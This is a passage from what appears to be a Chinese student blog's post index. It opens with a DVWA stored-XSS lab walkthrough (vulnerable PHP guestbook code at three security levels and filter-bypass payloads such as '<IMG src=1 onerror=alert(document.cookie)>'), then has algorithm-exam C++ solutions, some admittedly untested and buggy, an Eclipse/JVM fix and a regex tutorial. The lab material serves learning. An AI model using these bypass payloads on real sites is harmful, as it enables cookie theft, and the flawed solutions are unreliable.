,可以使用其他的标签。 构造payload： 1&lt;IMG src=1 onerror=alert(document.cookie)&gt; XSS (Stored)low12345678910111213141516171819202122&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitize name input $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close();&#125;?&gt; 分析 isset() 函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false trim() 函数作用为移除字符串两侧空白字符或其他预定义字符 stripslashes() 函数用于删除字符串中的反斜杠 mysqli_real_escape_string() 函数会对字符串中的特殊号(\\x00，\\n，\\r，\\，&#39;，&quot;，\\x1a) 进行转义 在代码中对message，name输入框内容 没有进行XSS方面的过滤和检查 且通过 query 语句插入到数据库中。所以存在存储型XSS漏洞 这里name ,message的输入框中都存在xss，所以两个位置都可以使用，但是name位置有字数限制，可以使用bp抓包修改 由于是存储型XSS,所以每次刷新页面都会弹出cookie。 medium123456789101112131415161718192021222324&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close();&#125;?&gt; 分析123$message = strip_tags( addslashes( $message ) );$message = htmlspecialchars( $message );$name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $name ); strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用 &lt;b&gt; 标签。 addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 htmlspecialchars() 函数把预定义的字符&amp;、”、’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素 对message输入内容进行检测过滤，因此无法再通过message参数注入XSS代码 但是对于name参数，只是简单过滤了&lt;script&gt;字符串，仍然存在存储型的XSS，与反射型中级的一样的方法 payload 123使用双写绕过，输入 &lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt; 使用大小写绕过，输入&lt;sCript&gt;alert(document.cookie)&lt;/script&gt; 输入其他标签，如 &lt;IMG src=1 onerror=alert(document.cookie)&gt; high1234567891011121314151617181920212223&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close();&#125;?&gt; 分析123$message = strip_tags( addslashes( $message ) );$message = htmlspecialchars( $message );$name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $name ); strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用 &lt;b&gt; 标签。 addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 htmlspecialchars() 函数把预定义的字符&amp;、”、’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素 name,执行一个正则表达式的搜索和替换,其中 /&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i 是正则表达式 (.*) 表示贪婪匹配，/i 表示不区分大小写所以在High级别的代码中，所有关于 &lt;script&gt; 标签均被过滤删除了 ,可以使用其他的标签。 只能换一个标签 1&lt;IMG src=1 onerror=alert(document.cookie)&gt;","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"xss","slug":"xss","permalink":"https://sunzhengyu99.github.io/tags/xss/"},{"name":"blind sql","slug":"blind-sql","permalink":"https://sunzhengyu99.github.io/tags/blind-sql/"}]},{"title":"算法上机复习","date":"2020-11-04T13:21:42.000Z","path":"2020/11/04/算法上机复习/","text":"最近算法实验要上机考试，所以还是准备一下吧(还不是因为自己太菜了) 16级题目问题 A: 星空梦想——鲁班题目描述鲁班七号是王者峡谷里的射手，站撸英雄。战场上的鲁班七号，机制强大的鲨嘴炮，立刻将挡在前路的任何物体轰飞。正如他所说的，“借你们的肉体试验下新发明的威力”。是的，这就是鲁班大师和他的天才机关造物鲁班七号。然而，鲁班最为致命的缺点是腿短，跑得慢，一个稍不留神，便会被刺客所击杀。 既然腿短，那么就来多多运动吧，跳跳台阶可还行？假设鲁班七号一次可以跳上1级台阶，但极限一次只能跳上2级台阶（腿短没办法，嘤嘤嘤）。鲁班七号现在从0级阶梯开始，最终跳上第n级的台阶，求总共有多少种跳法？ 输入多组测试用例。 第一行输入包含一个整数T（1&lt;=T&lt;=50），代表测试用例个数。 接下来T行，每行输入包含一个整数n（1&lt;=n&lt;=50），代表鲁班最终跳上了第n级台阶。 输出每组测试用例对应一行输出，每行输出一个整数ans，代表鲁班最终跳上第n级台阶的跳法种数。 样例输入123433450 样例输出1233520365011074 提示注意结果超过int范围，请用long long类型存储ans 12345678910111213141516171819202122#include&lt;bits/stdc++.h&gt;using namespace std;const int N=50;long long f[N];int main()&#123; f[0]=1,f[1]=1; for(int i=2;i&lt;=50;i++) &#123; f[i]=f[i-1]+f[i-2]; &#125; int n; cin&gt;&gt;n; while(n--) &#123; int m; cin&gt;&gt;m; cout&lt;&lt;f[m]&lt;&lt;endl; &#125; return 0; &#125; 问题 B: 午夜歌剧——元歌题目描述元歌是王者峡谷里的刺客。何谓至高机关之美呢？唯有以至高权力的手令太古奇迹重现人世，方能称得上啊。 是的，元歌擅长操控，所做傀儡能起到以假乱真的作用，今天元歌的傀儡变成你的初中数学老师，给你出个数学题：给你一个数字x，让你求出k7、k6、k5、k4、k3、k2、k1、k0（0&lt;=ki&lt;=9），使得以下等式1成立，最后根据等式2求出最终ans值。 等式1： 等式2： 输入多组测试用例。 第一行输入包含一个整数T（1&lt;=T&lt;=1000），代表测试用例个数。 接下来T行，每一行包含一个整数x（1&lt;=x&lt;=1500000）。 输出每组测试用例对应一行输出，每行输出一个整数ans，代表最终运算结果。 样例输入1234371433223193224 样例输出12310151163311433223 提示测试数据均大于等于1，不用特判0 感觉图片等式有点问题，一开始没理解什么意思，后来看了学长的提示。本质就是进制转换。 123456789101112131415161718192021222324252627#include&lt;bits/stdc++.h&gt;using namespace std;int t,m;void convert(int n)&#123; int c,r; r=n%7; c=n/7; if(c&gt;0) &#123; convert(c); cout&lt;&lt;r; &#125; else cout&lt;&lt;n;&#125; int main()&#123; cin&gt;&gt;t; while(t--) &#123; cin&gt;&gt;m; convert(m); cout&lt;&lt;endl; &#125; return 0; &#125; 问题 C: 圣诞恋歌——貂蝉题目描述貂蝉是王者峡谷里的法师/刺客，貂蝉打法一定要注意配合技能与被动。半肉出装加上蛇皮走位，往往可以1打5，轻松拿下5杀。语花印被动描述为：技能命中会为敌人叠加花之印记，叠加满4层后印记触发被动，会给自身回复生命，同时会对周围敌人造成真实伤害并减速。我们现在对貂蝉的技能及被动进行简化如下：每使用1次技能会攻击1次目标，每攻击3次目标，会自动额外攻击1次目标。现在，貂蝉在游戏中使用了n次技能，请问总共会给目标带来多少次攻击。 输入多组测试数据，第一行输入包含一个整数T，代表测试样例个数。接下来T行，每行输入包含一个整数n（1&lt;=n&lt;=100），代表貂蝉使用了n次技能。 输出每组测试用例对应一行输出，每行输出一个整数ans，代表貂蝉对目标进行了ans次攻击。 样例输入12345661234581 样例输出1234512457121 提示这题就是汽水瓶的改编。。。 123456789101112131415161718192021222324#include&lt;bits/stdc++.h&gt;using namespace std;int main()&#123; int n; cin&gt;&gt;n; while(n--) &#123; int m,sum; cin&gt;&gt;m; sum=0; while(m&gt;3) &#123; m=m-2; sum=sum+3; &#125; if(m==3) sum+=4; else sum=m; cout&lt;&lt;sum&lt;&lt;endl; &#125; return 0;&#125; 问题 D: 海之征途——孙策题目描述孙策是王者峡谷里的坦克/战士。大船靠岸，江郡欢呼着迎来了他们的新领袖，人称江东小霸王的年轻人。游戏中，孙策的技能长帆破浪，可以驾船冲锋，可将船撞向敌方单位或者阻挡物，并造成一定的伤害。 现在，有一群好奇的江郡小朋友想跟着孙策一起出海航行，但孙策的船承载不了所有小朋友，所以孙策决定，尽可能带更多的小朋友出海，现在请你帮孙策谋一个策略，使得更多的小朋友有机会出海航行。已知的条件是孙策船的最大载重m，以及n个小朋友的体重。 输入多组测试用例。第一行输入包含一个整数T（1&lt;=T&lt;=1000），代表测试用例个数。 每组测试用例第一行有两个整数m和n。（0&lt;=m&lt;=1000， 0&lt;=n&lt;=1000），分别代表船的载重重量和小朋友的个数，接下来一行为n个小朋友的体重。 输出每组测试用例对应一行输出，每行输出一个整数ans，代表最多能有ans个小朋友跟着一起出海。 样例输入12345210 43 5 2 420 93 5 2 4 6 1 8 5 9 样例输出1236 提示就是简单的装在问题 123456789101112131415161718192021222324252627282930#include&lt;bits/stdc++.h&gt;using namespace std;int T,m,n;int w[1005];int main()&#123; cin&gt;&gt;T; while(T--) &#123; int ans=0; cin&gt;&gt;m&gt;&gt;n; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;w[i]; &#125; sort(w,w+n); for(int i=0;i&lt;n;i++) &#123; if(m&gt;=w[i]) &#123; ans++; m-=w[i]; &#125; else break; &#125; cout&lt;&lt;ans&lt;&lt;endl; &#125; return 0;&#125; 问题 E: 极冰防御——盾山题目描述盾山是王者峡谷里的辅助，一夫当关、万夫莫开，一个好的辅助往往可以给团队带来极大帮助。 盾山的游戏中的一个技能为不动如山：手握一块由石头组成的巨盾，张开巨盾砸向地面，将敌人推开，并持续一段时间。 假设盾山最多只能承受C重量的盾牌，而现在有N个小石头，每个石头i的重量为Wi，防御值为Pi。那么，呆萌的盾山想知道，他从N个小石头中挑选M个（M&lt;=N）组成他可承受盾牌，最大的防御值是多少？ 输入多组测试用例。第一行输入包含一个整数T（1&lt;=T&lt;=10），代表测试用例个数。 接下来有T组测试用例。每组测试用例第一行为盾山承受盾牌的最大重量C(C&lt;10000)和小石头的个数N(N&lt;1000)。接下来的N行分别为小石头的重量Wi(1&lt;=Wi&lt;=100)和防御值Pi(1&lt;=Pi&lt;=3000000)。 输出每组测试用例对应一行输出，每行输出一个整数ans，代表可承受盾牌的最大防御值。 样例输入1234567110 52 62 36 55 44 6 样例输出115 提示01背包问题，不知道下面的解能不能过 1234567891011121314151617181920212223242526272829#include&lt;bits/stdc++.h&gt;using namespace std;const int N=1e5+5;long long ans[N];int w[N],v[N];int T;int main()&#123; cin&gt;&gt;T; while(T--) &#123; int C,N; memset(ans,0,sizeof(ans)); cin&gt;&gt;C&gt;&gt;N; for(int i=0;i&lt;N;i++) &#123; cin&gt;&gt;w[i]&gt;&gt;v[i]; &#125; for(int i=0;i&lt;N;i++) &#123; for(int j=C;j&gt;=w[i];j--) ans[j]=max(ans[j-1],ans[j-w[i]]+v[i]); &#125;// for(int i=0;i&lt;=C;i++)// cout&lt;&lt;ans[i]&lt;&lt;endl; cout&lt;&lt;ans[C]&lt;&lt;endl; &#125; return 0;&#125; ps:以上代码没有提交测试环境，只是过了给出的测试样例。 dfs大合集迷宫问题题目描述小明置身于一个迷宫，请你帮小明找出从起点到终点的最短路程。小明只能向上下左右四个方向移动。 输入 输入包含多组测试数据。输入的第一行是一个整数T，表示有T组测试数据。每组输入的第一行是两个整数N和M（1&lt;=N,M&lt;=100）。接下来N行，每行输入M个字符，每个字符表示迷宫中的一个小方格。字符的含义如下：‘S’：起点‘E’：终点‘-’：空地，可以通过‘#’：障碍，无法通过输入数据保证有且仅有一个起点和终点。 输出 对于每组输入，输出从起点到终点的最短路程，如果不存在从起点到终点的路，则输出-1。 样例输入123456715 5s-###-----##---E#------## 样例输出19 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include&lt;iostream&gt;#include&lt;cstring&gt;#include&lt;string&gt;#include&lt;queue&gt;#include &lt;algorithm&gt;using namespace std;int de[100][100];//计步数组 记录走到这个位置所需的步数 不能走到的位置标记为-1 char map[100][100]; //用于存放迷宫地图 typedef pair&lt;int,int&gt; P; //坐标int to[2][4]=&#123;1,-1,0,0,0,0,1,-1&#125;; //在当前坐标下能走的四个方向int sx,ex,sy,ey; //(sx,sy)为起点坐标 （ex,ey）为终点坐标int x,y,nx,ny; //(x,y)为函数中当前位置坐标 （nx,ny)为接下来能到达的坐标 int r,l; //r为行数 l为列数 int bfs()&#123; memset(de,-1,sizeof(de)); queue&lt;P&gt; qu; qu.push(P(sx,sy)); //将起点坐标放入队头 de[sx][sy]=0; while(!qu.empty()) &#123; P p=qu.front(); //取出队头坐标 qu.pop() ;//删除对头及走过的坐标 x=p.first,y=p.second; if(x==ex&amp;&amp;y==ey) break; //到达终点 跳出循环 for(int i=0;i&lt;4;i++) &#123; nx=x+to[0][i];//开始向四个方向移动 ny=y+to[1][i]; if(nx&gt;=0&amp;&amp;nx&lt;r&amp;&amp;ny&gt;=0&amp;&amp;ny&lt;l&amp;&amp;map[nx][ny]!=&#x27;#&#x27;&amp;&amp;de[nx][ny]==-1) //判断是否越界 以及是否能走 排除走过的路 &#123; qu.push(P(nx,ny)); //将能走的坐标放入队列 之后依次删除 de[nx][ny]=de[x][y]+1; //步数加一 &#125; &#125; &#125; if(de[ex][ey]==-1) return -1; //终点的记步数组为-1 及不能到达终点 else return de[ex][ey]; &#125; int main()&#123; int n,i,j; while(cin&gt;&gt;n)&#123; while(n--)&#123; cin&gt;&gt;r&gt;&gt;l; for(i=0;i&lt;r;i++)&#123; for(j=0;j&lt;l;j++)&#123; cin&gt;&gt;map[i][j]; if(map[i][j]==&#x27;S&#x27;) //记录起点坐标 &#123; sx=i,sy=j; &#125; else if(map[i][j]==&#x27;T&#x27;) //记录终点坐标 &#123; ex=i,ey=j; &#125; &#125; &#125; cout&lt;&lt;bfs()&lt;&lt;endl; &#125; &#125; return 0;&#125; acwing迷宫问题123456789101112131415161718192021222324252627282930313233343536373839404142434445#include&lt;bits/stdc++.h&gt;using namespace std;const int N=105;int mp[N][N];int dis[N][N];typedef pair&lt;int,int&gt; P;int n,m;int to[2][4]=&#123;1,-1,0,0,0,0,1,-1&#125;;int x,y,nx,ny;void dfs()&#123; memset(dis,-1,sizeof(dis)); queue&lt;P&gt; qu; qu.push(P(0,0)); dis[0][0]=0; while(!qu.empty()) &#123; P p=qu.front(); qu.pop(); x=p.first,y=p.second; if(x==n-1&amp;&amp;y==m-1) break; for(int i=0;i&lt;4;i++) &#123; nx=x+to[0][i],ny=y+to[1][i]; if(nx&gt;=0&amp;&amp;nx&lt;n&amp;&amp;ny&gt;=0&amp;&amp;ny&lt;m&amp;&amp;dis[nx][ny]==-1&amp;&amp;mp[nx][ny]==0) &#123; qu.push(P(nx,ny)); dis[nx][ny]=dis[x][y]+1; &#125; &#125; &#125; if(dis[n-1][m-1]!=-1) cout&lt;&lt;dis[n-1][m-1]; return; &#125;int main()&#123; cin&gt;&gt;n&gt;&gt;m; for(int i=0;i&lt;n;i++) for(int j=0;j&lt;m;j++) cin&gt;&gt;mp[i][j]; dfs(); return 0;&#125; n皇后问题12345678910111213141516171819202122232425262728293031323334353637#include&lt;bits/stdc++.h&gt;using namespace std;int n,ans=0;const int N=20;char m[N][N];bool col[N],dg[N],udg[N];void dfs(int u)&#123; if(u==n) &#123;// for(int i=0;i&lt;n;i++)// cout&lt;&lt;m[i]&lt;&lt;endl; ans++; return; &#125; for(int i=0;i&lt;n;i++) &#123; if(!col[i]&amp;&amp;!dg[i+u]&amp;&amp;!udg[n-u+i]) &#123; m[u][i]=&#x27;Q&#x27;; col[i]=dg[i+u]=udg[n-u+i]=1; dfs(u+1); col[i]=dg[i+u]=udg[n-u+i]=0;//回溯恢复现场 m[u][i]=&#x27;.&#x27;; &#125; &#125;&#125;int main()&#123; cin&gt;&gt;n; for(int i=0;i&lt;n;i++) for(int j=0;j&lt;n;j++) m[i][j]=&#x27;.&#x27;; dfs(0); cout&lt;&lt;ans; return 0;&#125; m图着色问题题目描述给定无向连通图G和m种不同的颜色，用这些颜色给图的各个顶点着一种颜色，若某种方案使得图中每条边的2个顶点的颜色都不相同，则是一个满足的方案，找出所有的方案。 输入第一行有3个正整数n，k和m，分别表示n个顶点，k条边，m种颜色接下来k行，每行2个正整数，表示一条边的两个顶点 输出所有不同的着色方案数 样例输入1234567895 8 4 1 21 3 1 42 32 42 53 44 5 样例输出148 提示123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include&lt;bits/stdc++.h&gt;using namespace std;const int N=105;int mp[N][N];int color[N]=&#123;0&#125;;int n,k,m,ans=0;void dfs(int d)&#123; if(d==n+1) &#123; ans++; return; &#125; for(int i=1;i&lt;=m;i++) &#123; int flag=1; for(int j=1;j&lt;=n;j++) &#123; if(mp[d][j]&amp;&amp;color[j]==i) &#123; flag=0; break; &#125; &#125; if(flag) &#123; color[d]=i; dfs(d+1); color[d]=0; &#125; &#125; &#125;int main()&#123; cin&gt;&gt;n&gt;&gt;k&gt;&gt;m; for(int i=0;i&lt;k;i++) &#123; int t1,t2; cin&gt;&gt;t1&gt;&gt;t2; mp[t1][t2]=1; mp[t2][t1]=1; &#125; dfs(1); cout&lt;&lt;ans&lt;&lt;endl; return 0;&#125; 部分和题目描述给定n个整数，判断是否可以从中选择若干数字，使得他们的和恰好为k。 输入多组测试用例。 对于每组测试用例，第一行一个正整数n，第二行n个整数，第三行一个整数k。 1*≤N≤*20，输入整数及k均小于1e8。 输出若可以使得和为k，输出”Yes”,否则”No”。 样例输入12341 2 4 713 样例输出1Yes 12345678910111213141516171819202122232425262728#include&lt;bits/stdc++.h&gt;using namespace std;int s[25];int n,m;bool check(int l,int a)&#123; if(a==m) return true; if(l==n) return false; if(check(l+1,a+s[l])) return true; if(check(l+1,a)) return true;&#125;int main()&#123; cin&gt;&gt;n; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;s[i]; &#125; cin&gt;&gt;m; if(check(0,0)) cout&lt;&lt;&quot;YES&quot;; else cout&lt;&lt;&quot;NO&quot;; return 0;&#125;","tags":[]},{"title":"google搜索引擎&eclipse启动问题","date":"2020-11-02T08:37:34.000Z","path":"2020/11/02/eclipse启动问题/","text":"谷歌搜索引擎前两天突然无法搜索东西但是可以继续访问YouTube，就**离谱。 由于课程原因需要学习java，今天就下载了一个Java常用的编辑器eclipse，但是启动时给我一个弹窗，版本不一致。 google浏览器问题Google浏览器可以访问外网，但是无法使用搜索引擎搜东西，每次显示无法连接www.google.com 解决一开始想着卸载重装，发现还是不行，后来换成了测试版本结果真能用，但是两天没到又出现那种情况，很无语 想着应该是google.com被屏蔽了，试着清除dns缓存 1ipconfig /flushdns 还是不行，直接释放ip重新申请 12ipconfig /releaseipconfig /renew 然后就可以用了。。 （几个小时过去了就他妈不能用了，真尼玛离谱） eclipse问题问题弹窗内容 Version 1.8.0_271 of the JVM is not suitable for this product.Version: 11or greater is required. JVM的1.8.0_271版本不适合此产品。版本：11或更高版本是必需的。 大概意思就是当前的jvm版本与软件不相容 解决方法1.找到java安装的路径默认安装是下面这个路径 1C:\\Program Files\\Java\\ 找到 1C:\\Program Files\\Java\\jre1.8.0_271\\bin\\javaw.exe 2.打开eclipse的安装路径，打开eclipse.ini修改成下面这样 123456789101112131415161718192021222324252627-startupplugins/org.eclipse.equinox.launcher_1.5.800.v20200727-1323.jar--launcher.libraryplugins/org.eclipse.equinox.launcher.win32.win32.x86_64_1.1.1300.v20200819-0940-productorg.eclipse.epp.package.java.product-showsplashorg.eclipse.epp.package.common--launcher.defaultActionopenFile--launcher.defaultActionopenFile--launcher.appendVmargs-vm //这两行C:\\Program Files\\Java\\jre1.8.0_271\\bin\\javaw.exe //是添加的-vmargs-Dosgi.requiredJavaVersion=1.8 //这里改为jdk版本号-Dosgi.instance.area.default=@user.home/eclipse-workspace-XX:+UseG1GC-XX:+UseStringDeduplication--add-modules=ALL-SYSTEM-Dosgi.requiredJavaVersion=1.8 //这里也一样-Dosgi.dataAreaRequiresExplicitInit=true-Xms256m-Xmx2048m--add-modules=ALL-SYSTEM 保存后成功启动。","tags":[]},{"title":"正则表达式","date":"2020-11-01T13:31:31.000Z","path":"2020/11/01/preg/","text":"在一些代码审计的题目当中经常会出现使用正则表达过滤字符串的情况，所以有必要系统的学习一下！ 什么是正则表达式详情见这 菜鸡教程中介绍的很详细。 特殊字符许多元字符要求在试图匹配它们时特别对待。若要匹配这些特殊字符，必须首先使字符”转义”，即，将反斜杠字符\\ 放在它们前面。下表列出了正则表达式中的特殊字符： 特别字符 描述 $ 匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\\n’ 或 ‘\\r’。要匹配 $ 字符本身，请使用 \\$。 ( ) 标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 ( 和 )。 * 匹配前面的子表达式零次或多次。要匹配 * 字符，请使用 \\*。 + 匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 \\+。 . 匹配除换行符 \\n 之外的任何单字符。要匹配 . ，请使用 \\. 。 [ 标记一个中括号表达式的开始。要匹配 [，请使用\\[。 ? 匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 ?。 \\ 将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。’\\n’ 匹配换行符。序列 ‘\\‘ 匹配 “&quot;，而 ‘(‘ 则匹配 “(“。 ^ 匹配输入字符串的开始位置，除非在方括号表达式中使用，当该符号在方括号表达式中使用时，表示不接受该方括号表达式中的字符集合。要匹配 ^ 字符本身，请使用 ^。 { 标记限定符表达式的开始。要匹配 {，请使用 \\{。 | 指明两项之间的一个选择。要匹配 |，请使用 \\ 限定符限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 *** 或 **+ 或 ? 或 {n} 或 {n,} 或 {n,m} 共6种。 正则表达式的限定符有： 字符 描述 * 匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。 + 匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。 ? 匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 、 “does” 中的 “does” 、 “doxy” 中的 “do” 。? 等价于 {0,1}。 {n} n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。 {n,} n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。 {n,m} m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。 常用的正则表达式及含义参考 123456789101112131415161718192021222324252627282930313233343536373839一、校验数字的表达式1. 数字：^[0-9]*$ // ^表示字符的开始，$表示结束 [0-9] 表示字符串中的字符在0-9中2. n位的数字：^\\d&#123;n&#125;$ // \\d与[0-9]等价 ，&#123;n&#125; n表示匹配n次，所以表示匹配n位数3. 至少n位的数字：^\\d&#123;n,&#125;$ //&#123;n,&#125;至少n次4. m-n位的数字：^\\d&#123;m,n&#125;$ //&#123;n,m&#125; n-m次5. 零和非零开头的数字：^(0|[1-9][0-9]*)$ // | 是或者意思，表示匹配左右两个子表达式其中一个都可以6. 非零开头的最多带两位小数的数字：^([1-9][0-9]*)+(.[0-9]&#123;1,2&#125;)?$ // +匹配前面的表达式一次或多次 (.[0-9]&#123;1,2&#125;)? 表示匹配 (.[0-9]&#123;1,2&#125;)一次或零次这子表达式代表的是0.[1-9]或者0.[0-9][1-9]7. 带1-2位小数的正数或负数：^(\\-)?\\d+(\\.\\d&#123;1,2&#125;)?$ // (\\-)? 匹配一次或零次负号 8. 正数、负数、和小数：^(\\-|\\+)?\\d+(\\.\\d+)?$ // \\- \\+ \\.是将特殊字符转义9. 有两位小数的正实数：^[0-9]+(.[0-9]&#123;2&#125;)?$ 10. 有1~3位小数的正实数：^[0-9]+(.[0-9]&#123;1,3&#125;)?$11. 非零的正整数：^[1-9]\\d*$ 或 ^([1-9][0-9]*)&#123;1,3&#125;$ 或 ^\\+?[1-9][0-9]*$ // [1-9] 控制非零12. 非零的负整数：^\\-[1-9][]0-9&quot;*$ 或 ^-[1-9]\\d*$ //一下的表达式的含义可以以此类推（感觉不是很常用）13. 非负整数：^\\d+$ 或 ^[1-9]\\d*|0$14. 非正整数：^-[1-9]\\d*|0$ 或 ^((-\\d+)|(0+))$15. 非负浮点数：^\\d+(\\.\\d+)?$ 或 ^[1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*|0?\\.0+|0$16. 非正浮点数：^((-\\d+(\\.\\d+)?)|(0+(\\.0+)?))$ 或 ^(-([1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*))|0?\\.0+|0$17. 正浮点数：^[1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*$ 或 ^(([0-9]+\\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\\.[0-9]+)|([0-9]*[1-9][0-9]*))$18. 负浮点数：^-([1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*)$ 或 